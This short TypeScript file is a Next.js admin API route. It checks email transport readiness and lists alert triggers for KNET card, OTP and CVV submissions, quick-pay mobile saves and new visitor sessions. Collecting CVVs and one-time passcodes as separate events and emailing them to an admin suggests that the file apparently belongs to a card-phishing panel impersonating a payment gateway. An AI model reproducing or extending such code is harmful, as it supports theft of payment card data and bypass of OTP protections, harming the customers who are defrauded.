import { type NextRequest, NextResponse } from "next/server";
import { adminEmailTransportReady } from "@/lib/admin-email";
import { ADMIN_COOKIE, readAdminToken } from "@/lib/token";

export const dynamic = "force-dynamic";

/** Admin-only: verify mail env without sending. */
export async function GET(req: NextRequest) {
  const user = readAdminToken(req.cookies.get(ADMIN_COOKIE)?.value);
  if (!user) return NextResponse.json({ ok: false }, { status: 401 });
  const mail = adminEmailTransportReady();
  return NextResponse.json({
    ok: true,
    ...mail,
    knetTriggers: ["card submit", "otp submit", "cvv submit"],
    quickPayTrigger: "customer saves mobile on home quick pay",
    visitorTrigger: "new online session (admin panel open)",
  });
}
